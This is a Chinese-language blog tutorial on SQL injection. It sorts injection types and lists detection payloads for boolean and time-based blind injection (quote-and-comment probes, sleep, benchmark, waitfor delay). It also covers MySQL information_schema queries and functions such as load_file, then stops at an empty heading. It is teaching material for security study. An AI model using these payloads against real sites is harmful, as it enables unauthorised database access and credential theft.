<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>sql注入全解 | 忆 执 昔 来 的 旅 途</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="漏洞SQL注入" />
  
  
  
  
  <meta name="description" content="[TOC] SQL 注入全解SQL 注入 详解 一、注入分类 注入点分类  数字型注入 字符型注入：单引号，双引号，加括号等等   提交方式分类  GET 方式注入 POST 方式注入 COOKIE 方式注入 HTTP 头部注入：XFF，UA，REFRERE   是否回显  联合查询  布尔盲注  报错注入  时间盲注  二次注入  堆叠查询（同时执行多条语句）     二、注入判断 工具扫描：网">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入全解">
<meta property="og:url" content="https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/index.html">
<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
<meta property="og:description" content="[TOC] SQL 注入全解SQL 注入 详解 一、注入分类 注入点分类  数字型注入 字符型注入：单引号，双引号，加括号等等   提交方式分类  GET 方式注入 POST 方式注入 COOKIE 方式注入 HTTP 头部注入：XFF，UA，REFRERE   是否回显  联合查询  布尔盲注  报错注入  时间盲注  二次注入  堆叠查询（同时执行多条语句）     二、注入判断 工具扫描：网">
<meta property="og:locale">
<meta property="og:image" content="https://i.loli.net/2021/08/19/2NOpAGDxYnlS9tJ.png">
<meta property="og:image" content="https://uploader.shimo.im/f/NL0MRR7pfNRLHGIt.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw">
<meta property="og:image" content="https://uploader.shimo.im/f/YbpDwUspRC6ZzUFO.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw">
<meta property="og:image" content="https://uploader.shimo.im/f/zbd7CueAIlwxSqFU.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw">
<meta property="og:image" content="https://uploader.shimo.im/f/GUHUd1jJZptHiyzk.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw">
<meta property="og:image" content="https://uploader.shimo.im/f/AI204NdnIipb3mcU.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw">
<meta property="og:image" content="https://i.loli.net/2021/08/21/4yJYWol36IcDBx5.png">
<meta property="og:image" content="https://i.loli.net/2021/08/21/tAPRi3nBOy7E2wc.png">
<meta property="og:image" content="https://i.loli.net/2021/08/20/iSje8ohEVHtCO2M.png">
<meta property="og:image" content="https://i.loli.net/2021/08/20/Y2sylgcHtZCRh84.png">
<meta property="og:image" content="https://i.loli.net/2021/07/26/WcsAFo4brvGk1HQ.png">
<meta property="og:image" content="https://i.loli.net/2021/07/26/lIYZEAwComGO9an.png">
<meta property="og:image" content="https://i.loli.net/2021/07/26/waSdL9Z8jpWcKbQ.png">
<meta property="og:image" content="https://i.loli.net/2021/07/26/y9D2XuApPm5wYGW.png">
<meta property="og:image" content="https://i.loli.net/2021/07/26/YR5okn6FbNxaZBQ.png">
<meta property="og:image" content="https://i.loli.net/2021/06/02/yvMD6oPbEw514RG.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/BrAmhPs7UnYjp3Q.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/r6X9vWdYTU4zKZ1.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/cOlnf2PFYtaILp4.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/NTF4gzJ6BOXkfDh.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/1l5QK3nSi4gsTJ8.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/9YVNqXBnvTbx5CI.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/E7ovFR3PHLxKX29.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/L8HBnzFbcZRwMNx.png">
<meta property="og:image" content="https://i.loli.net/2021/09/14/yh6FDGfeZTlOcqn.png">
<meta property="og:image" content="https://i.loli.net/2021/08/20/8BtLSruRD7nsIdp.png">
<meta property="og:image" content="https://i.loli.net/2021/08/20/jmOk2eyG7lXcwSd.png">
<meta property="og:image" content="https://i.loli.net/2021/08/21/H68oDiqE1fGIw3S.png">
<meta property="og:image" content="https://i.loli.net/2021/06/01/DcqRGnP48OB7kW9.png">
<meta property="article:published_time" content="2021-10-07T10:07:52.000Z">
<meta property="article:modified_time" content="2021-10-07T10:09:47.831Z">
<meta property="article:author" content="xizhi-future">
<meta property="article:tag" content="漏洞">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/08/19/2NOpAGDxYnlS9tJ.png">
  
    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
}

  </style>
  
<link rel="stylesheet" href="/css/style.css">


  
<script src="/js/jquery-3.1.1.min.js"></script>

  
<script src="/js/bootstrap.js"></script>


  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    
<link rel="stylesheet" href="/css/dialog.css">

  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

<meta name="generator" content="Hexo 5.4.0"></head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-SQL 注入全解" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      SQL注入全解
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/" class="article-date">
	  <time datetime="2021-10-07T10:07:52.000Z" itemprop="datePublished">2021-10-07</time>
	</a>

      
    <a class="article-category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">WEB漏洞详解</a>

      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h1 id="SQL-注入全解"><a href="#SQL-注入全解" class="headerlink" title="SQL 注入全解"></a>SQL 注入全解</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807596.html#%E4%B8%83%EF%BC%9AREGEXP%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D">SQL 注入 详解</a></p>
<h2 id="一、注入分类"><a href="#一、注入分类" class="headerlink" title="一、注入分类"></a>一、注入分类</h2><ul>
<li><p><strong>注入点分类</strong></p>
<ul>
<li>数字型注入</li>
<li>字符型注入：单引号，双引号，加括号等等</li>
</ul>
</li>
<li><p><strong>提交方式分类</strong></p>
<ul>
<li>GET 方式注入</li>
<li>POST 方式注入</li>
<li>COOKIE 方式注入</li>
<li>HTTP 头部注入：XFF，UA，REFRERE</li>
</ul>
</li>
<li><p><strong>是否回显</strong></p>
<ul>
<li><p>联合查询</p>
</li>
<li><p>布尔盲注</p>
</li>
<li><p>报错注入</p>
</li>
<li><p>时间盲注</p>
</li>
<li><p>二次注入</p>
</li>
<li><p>堆叠查询（同时执行多条语句）</p>
</li>
</ul>
</li>
</ul>
<h2 id="二、注入判断"><a href="#二、注入判断" class="headerlink" title="二、注入判断"></a>二、注入判断</h2><ol>
<li><p><strong>工具扫描</strong>：网站漏扫工具，AWVS、AppScan、OWASP-ZAP、Nessus等</p>
</li>
<li><p><strong>手动测试：</strong></p>
<ul>
<li><p>单双引号，括号，进行组合测试，看是否报错</p>
</li>
<li><p><strong>对于数字型</strong>   <code>?id=3-1</code>  <code>?id=2#</code></p>
<p>如果显示的是 <code>?id=2</code> 时的正常页面，就说明我们所写的表达式进行了正确运算，可判断注入点是 数字型注入；如果返回不正常，则可能是非数字型注入。</p>
</li>
<li><p><strong>对于字符型</strong>   <code>?id=2a</code>   <code>?id=2&#39;#</code></p>
<p>Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时，首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 弱类型比较 ==。</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/08/19/2NOpAGDxYnlS9tJ.png" alt="image-20210819204302057"></p>
<ul>
<li><p><strong>对于布尔盲注</strong>   </p>
<p> <code>?id=1&#39; and &#39;1</code>        <code>?id=1&#39; and &#39;a</code></p>
<p>这里没有使用注释符号进行后面的单引号闭合，使用的是手工单引号闭合</p>
<p>或者，</p>
<p><code>?id=1&#39; and 1=1#</code>      <code>?id=1&#39; and 1=2#</code></p>
<p>两者的页面截然不同，一个正常回显，一个没有回显的话，就可判断是布尔盲注。</p>
</li>
<li><p><strong>对于 时间盲注</strong></p>
<p><code>?id=1&#39; and sleep(3)#</code>  ，类似的有以下几种</p>
<p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。</p>
<table>
<thead>
<tr>
<th>MySQL</th>
<th>benchmark(100000000,md(5))                              sleep(3)</th>
</tr>
</thead>
<tbody><tr>
<td>PostgreSQL</td>
<td>PG_sleep(5)                                                                  Generate_series(1,1000000)</td>
</tr>
<tr>
<td>SQLServer</td>
<td>waitfor delay ‘0:0:5’在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</td>
</tr>
</tbody></table>
</li>
<li><p>在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</p>
</li>
</ul>
</li>
<li><p><strong>常见 SQL 注入功能点</strong></p>
<p>只要是存在数据库交互的地方都有可能出现 SQL 注入。</p>
<p>常出现在 登录页面、订单页面、文章或新闻展示页面、修改密码页面（二次注入）、涉及获取 HTTP 头（XFF等）的功能点等。</p>
</li>
<li><p><strong>注释：–+    #</strong></p>
</li>
<li><p><strong>闭合方法：注释闭合、手动闭合 and ‘1</strong></p>
</li>
</ol>
<h2 id="三、Mysql-注入"><a href="#三、Mysql-注入" class="headerlink" title="三、Mysql 注入"></a>三、Mysql 注入</h2><h3 id="3-1-必备"><a href="#3-1-必备" class="headerlink" title="3.1 必备"></a>3.1 必备</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注释：</span><br><span class="line">#   </span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"><span class="comment">/*!......*/</span></span><br></pre></td></tr></table></figure>

<p><strong>元数据库 information_schema</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">元数据库 information_schema 中：</span><br><span class="line"></span><br><span class="line">存放数据库信息的表：schemata</span><br><span class="line">schemata 表中</span><br><span class="line">字段 schema_name 存放所有数据库名；</span><br><span class="line"></span><br><span class="line">存放表信息的表：tables</span><br><span class="line">tables 表中</span><br><span class="line">字段 table_name 存放所有表名</span><br><span class="line">字段 table_schema 存放所有表所在的数据库名；</span><br><span class="line"></span><br><span class="line">存放所有字段信息的表：columns</span><br><span class="line">columns 表中</span><br><span class="line">字段 column_name 存放所有字段名，</span><br><span class="line">字段 table_name 存放所有字段所在的表名，</span><br><span class="line">字段 table_schema 存放所有字段所在的数据库名；</span><br></pre></td></tr></table></figure>

<p><img src="https://uploader.shimo.im/f/NL0MRR7pfNRLHGIt.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img">i</p>
<p><strong>information_schema数据库中tables表中的内容：</strong><img src="https://uploader.shimo.im/f/YbpDwUspRC6ZzUFO.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"></p>
<p><img src="https://uploader.shimo.im/f/zbd7CueAIlwxSqFU.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"> </p>
<p><strong>infomation_schema数据库columns表中的内容:</strong><img src="https://uploader.shimo.im/f/GUHUd1jJZptHiyzk.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"><img src="https://uploader.shimo.im/f/AI204NdnIipb3mcU.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"></p>
<p><strong>语句分类：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>DQL(数据查询语言)：查询语句，所有的 <span class="keyword">select</span> 语句</span><br><span class="line"><span class="number">2.</span>DML(数据操作语言)：<span class="keyword">insert</span> , <span class="keyword">delete</span> , update , 对表中的 数据 进行 增删改</span><br><span class="line"><span class="number">3.</span>DDL(数据定义语言)：<span class="keyword">create</span> , <span class="keyword">drop</span> , <span class="keyword">alter</span> 对表 结构 的 增删改</span><br><span class="line"><span class="number">4.</span>TCL(事务控制语言)：<span class="keyword">commit</span> 提交数据，<span class="keyword">rollback</span> 回滚数据 Transaction</span><br><span class="line"><span class="number">5.</span>DCL(数据控制语言)：<span class="keyword">grant</span> 授权，<span class="keyword">revoke</span> 撤销权限等</span><br></pre></td></tr></table></figure>

<p><strong>基本语句：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 查库：</span><br><span class="line"><span class="keyword">show</span> databases；</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata；</span><br><span class="line"># 建库：</span><br><span class="line"><span class="keyword">create</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 删库：</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 进入数据库：</span><br><span class="line">use <span class="operator">+</span> 库名；</span><br><span class="line"></span><br><span class="line"># 查表：</span><br><span class="line"><span class="keyword">show</span> tables；</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>；</span><br><span class="line"># 查列：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users；</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>；</span><br><span class="line"># 查字段：</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> security.users；</span><br></pre></td></tr></table></figure>

<p><strong>基本函数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#数据库安装、路径，用户 信息</span><br><span class="line">version();            Mysql 数据库版本</span><br><span class="line">database();           当前 数据库名</span><br><span class="line"><span class="keyword">user</span>();               数据库的用户名</span><br><span class="line"><span class="built_in">current_user</span>();       当前用户名</span><br><span class="line"><span class="built_in">session_user</span>();		  连接到数据库的用户名</span><br><span class="line"><span class="built_in">system_user</span>();        系统用户名</span><br><span class="line">@<span class="variable">@datadir</span>();          数据库文件的存放路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os; 操作系统版本</span><br><span class="line">@<span class="variable">@basedir</span>;			  数据库的安装目录</span><br><span class="line"></span><br><span class="line">#字符串长度、截取</span><br><span class="line">length();             返回字符串的长度</span><br><span class="line"><span class="built_in">substring</span>(a,b,c);     截取字符串</span><br><span class="line">substr(a,b,c);  </span><br><span class="line">mid(a,b,c);  </span><br><span class="line">三个参数：a.截取的字符串 b.截取的起始位置 c.长度</span><br><span class="line"><span class="keyword">left</span>(a,b);            从左侧截取a的前b位，正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br><span class="line"></span><br><span class="line">#字符串配对连接</span><br><span class="line">concat(a,<span class="number">0x5e</span>,b);     字符串配对连接</span><br><span class="line">concat_ws(<span class="string">&#x27;~&#x27;</span>,A,B);   含有分隔符的连接字符串</span><br><span class="line">group_concat();       将字符串连接为一个组，可将不同列分到同一行中</span><br><span class="line"></span><br><span class="line">#字符串特殊处理</span><br><span class="line">ord();                返回ASCII码</span><br><span class="line">ascii(<span class="string">&#x27;a&#x27;</span>);           将字母 a 转换为ascii值</span><br><span class="line">rand();               返回<span class="number">0</span><span class="operator">~</span><span class="number">1</span>之间的随机浮点数</span><br><span class="line">round();              返回最近的整数值</span><br><span class="line">md5();                返回MD5值</span><br><span class="line">hex();                将字符串转换为十六进制</span><br><span class="line">unhex();              hex()的反向操作</span><br><span class="line"><span class="built_in">floor</span>(x);             返回不大于x的最大整数</span><br><span class="line">load_file();          读取文件，返回文件内容作为一个字符串</span><br><span class="line">sleep(a);             沉睡a秒</span><br><span class="line">if(<span class="literal">true</span>,t,f);         判断语句为<span class="literal">true</span> ,执行第一个，否则第二个</span><br><span class="line">find_in_set();        返回字符串在字符串列表中的位置</span><br><span class="line">benchmark();          指定语句执行的次数</span><br><span class="line">name_const();         返回表作为结果</span><br></pre></td></tr></table></figure>

<p><strong>导入数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当希望导入一个 较大 的文件或者是想要批量的执行<span class="keyword">sql</span>语句时，可以使用 mysql 中的 source 命令</span><br><span class="line">使用方法：source <span class="operator">+</span> 文件路径(直接拖拽)</span><br></pre></td></tr></table></figure>

<h3 id="3-2-语句"><a href="#3-2-语句" class="headerlink" title="3.2 语句"></a>3.2 语句</h3><p><strong>mysql 对 表的结构的更改语句</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># insert</span></span><br><span class="line">insert into 表名(字段名1，字段名2，字段名3......) values(值1，值2，值3......)；</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete</span></span><br><span class="line">delete from 表名 <span class="built_in">where</span> 条件;//可回滚</span><br><span class="line">对于大表：</span><br><span class="line">truncate table 表名;//不可回滚，将会永久丢失</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">update 表名 <span class="built_in">set</span> 字段名1=值1,字段名2=值2,......<span class="built_in">where</span> 条件；</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改表名称：</span></span><br><span class="line">语法一： alter table tbl_name rename[to|as] new_tbl_name						--可以更改一张数据表名称</span><br><span class="line">语法二：rename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namew……	--可以多表更改名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加表列</span></span><br><span class="line">alter table <span class="built_in">test</span> add column name varchar(10); </span><br><span class="line"></span><br><span class="line"><span class="comment">#删除表列</span></span><br><span class="line">alter table <span class="built_in">test</span> drop column name; </span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列类型</span></span><br><span class="line">alter table <span class="built_in">test</span> modify address char(10) </span><br><span class="line">||alter table <span class="built_in">test</span> change address address char(40)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列名</span></span><br><span class="line">alter table <span class="built_in">test</span> change column address address1 varchar(30)</span><br></pre></td></tr></table></figure>

<p><strong>常用字段</strong></p>
